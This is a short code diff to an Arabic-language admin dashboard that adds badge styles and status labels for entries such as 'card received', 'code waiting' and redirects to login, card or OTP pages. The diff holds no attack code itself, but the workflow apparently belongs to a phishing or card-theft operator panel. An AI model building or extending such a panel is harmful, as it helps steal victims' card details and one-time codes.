@@ -82,13 +82,12 @@
   .td-actions{text-align:left;white-space:nowrap}
 
   .badge{display:inline-block;border-radius:6px;padding:4px 12px;font-size:13px;font-weight:700}
+  .badge.new{background:#e3f2fd;color:#1565c0}
   .badge.accepted{background:#d4f0e0;color:#1e9e5a}
   .badge.rejected{background:#fde8e8;color:var(--red)}
   .badge.pending{background:#fff3cd;color:#856404}
+  .badge.card{background:#fce4ec;color:#ad1457}
   .badge.redirected{background:#e8d5f5;color:#7b1fa2}
-  .badge.redirect_card{background:#e8d5f5;color:#7b1fa2}
-  .badge.redirect_otp{background:#e8d5f5;color:#7b1fa2}
-  .badge.redirect_cvv{background:#e8d5f5;color:#7b1fa2}
 
   /* action buttons in table */
   .tbl-btn{
@@ -466,12 +465,16 @@
   }
 
   function statusBadge(st) {
+    if (st === 'new') return '<span class="badge new">جديد</span>';
+    if (st === 'waiting') return '<span class="badge pending">الانتظار</span>';
+    if (st === 'code_waiting') return '<span class="badge pending">كود في الانتظار</span>';
+    if (st === 'card_received') return '<span class="badge card">بطاقة</span>';
     if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
     if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
     if (st === 'redirect_login') return '<span class="badge redirected">توجيه ← تسجيل الدخول</span>';
     if (st === 'redirect_card') return '<span class="badge redirected">توجيه ← البطاقة</span>';
     if (st === 'redirect_otp') return '<span class="badge redirected">توجيه ← الكود</span>';
-    return '<span class="badge pending">قيد الانتظار</span>';
+    return '<span class="badge pending">'+escapeHtml(st)+'</span>';
   }
 
   function pageLabel(p) {
